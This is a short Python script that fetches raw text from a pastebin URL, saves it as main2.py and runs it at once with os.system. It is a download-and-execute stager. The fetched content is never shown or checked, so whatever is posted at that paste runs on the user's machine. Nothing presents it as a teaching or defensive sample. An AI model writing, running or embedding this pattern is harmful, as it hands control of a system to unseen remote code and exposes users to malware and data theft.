import requests
import os
with open(r"main2.py","w", encoding="utf-8") as reload:
    response = requests.get(f"https://pastebin.com/raw/mQ6L7VTM")
    reload.write(str(response.text))

os.system("py main2.py")